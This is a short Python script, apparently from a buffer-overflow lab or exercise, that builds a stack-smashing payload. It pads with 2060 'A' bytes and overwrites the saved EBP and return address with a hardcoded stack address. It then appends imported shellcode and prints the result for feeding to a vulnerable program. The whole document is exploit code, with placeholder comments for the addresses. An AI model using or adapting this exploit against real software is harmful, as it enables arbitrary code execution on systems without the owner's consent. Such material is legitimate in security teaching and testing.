from shellcode import shellcode
import struct

# Replace this with your shellcode

# Padding to reach the saved EBP
padding = b'A' * 2060

# Get the address of the 'a' variable
a_address = 0xffffd0dc  # Replace with the correct address

# Get the address of the shellcode
shellcode_address = a_address + 4 + 4  # 4 bytes for the saved EBP, 4 bytes for the saved EIP

# Prepare the exploit string
exploit = padding + struct.pack('<I', a_address) + struct.pack('<I', shellcode_address) + shellcode

# Print the exploit string
print(exploit.decode('ISO-8859-1'))
